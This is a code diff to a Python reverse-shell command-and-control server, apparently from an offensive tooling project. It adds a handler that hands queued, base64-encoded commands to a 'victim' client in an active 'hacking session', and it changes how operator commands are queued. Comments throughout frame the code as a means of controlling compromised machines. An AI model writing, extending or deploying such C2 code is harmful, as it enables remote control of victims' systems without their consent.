@@ -1,7 +1,6 @@
 """ The reverse shell server and request handler. """
 
 # ---- imports
-import datetime
 import json as js
 import sys
 from binascii import Error as b64decodeError
@@ -47,7 +46,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                 HTTPMethod.GET,
             ],
             ut.ServerCommands.fetch_cmd: [
-                lambda: (False, HTTPStatus.NOT_IMPLEMENTED),
+                self.handle_cmd_fetch_cmd,
                 HTTPMethod.GET,
             ],
             ut.ServerCommands.fetch_res: [
@@ -182,6 +181,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Get the request body in bytes
         raw_data = self.rfile.read(content_length)
+
         # Now we expect that the data returned to be base64 encoded
         # let's try to decoded it and return None if not.
         try:
@@ -244,6 +244,38 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             True, HTTPStatus.OK, session_id, {"content-length": str(len(session_id))}
         )
 
+    def handle_cmd_fetch_cmd(
+        self, client_id: str, client_type: int, req_body: str | None
+    ):
+        """Handle fetch_cmd commands"""
+        session_id = req_body
+
+        # Check if there is no body(session_id) provided if not we need
+        # to tell the victim so
+        if session_id is None or session_id == "":
+            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
+
+        # let's check first if the session_id is up and running
+        if not self.hacking_sessions.check_session_active(session_id):
+            return sh.HandlerResponse(False, HTTPStatus.NOT_FOUND)
+
+        # Ok now we're sure we have an active session let's now
+        # send the victim the commands, but if the command is None
+        # rather send a response with no_content
+        command = self.hacking_sessions.get_command(session_id)
+
+        if command is None:
+            return sh.HandlerResponse(False, HTTPStatus.NO_CONTENT)
+
+        # Ok now let's send the command with an OK res code
+
+        # Encoding the command
+        command = ut.encode_token(command).encode()
+
+        return sh.HandlerResponse(
+            True, HTTPStatus.OK, command, {"content-length": str(len(command))}
+        )
+
     def handle_cmd_post_res(
         self, client_id: str, client_type: int, req_body: str | None
     ):
@@ -255,9 +287,6 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     ):
         self.headers
         """Do what needs to be done if the server command is 'post_cmd'"""
-        # First lets assign an ID to the command we are inserting to the db
-        command_id = ut.generate_token()
-
         # Bad request return message
         bad_request = sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
@@ -292,14 +321,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)
 
         # If we are in session with the victim and satisfy all the other requirements
-        # we can proceed by inserting the command in the database.
-        result = self.database.execute(
-            "INSERT INTO commands VALUES(?, ?, ?, ?)",
-            [command_id, session_id, command, datetime.date.today().isoformat()],
-        )
-
-        if result is None:
-            return (False, HTTPStatus.INTERNAL_SERVER_ERROR)
+        # we can proceed by inserting the command in the session comm.
+        self.hacking_sessions.insert_command(session_id, command)
 
         # If all went good, lets once again return the OK response
         return sh.HandlerResponse(True, HTTPStatus.CREATED)
@@ -384,7 +407,6 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             # Ok so first let's get the client-type from the database and
             # use that to check if the user can access the path it's accessing
             client_type = self.get_client_type_from_db(client_id)
-            print(client_type)
 
             # Check if the client has needed tokens for it's type
             has_tokens = legit_user[client_type.__str__()]
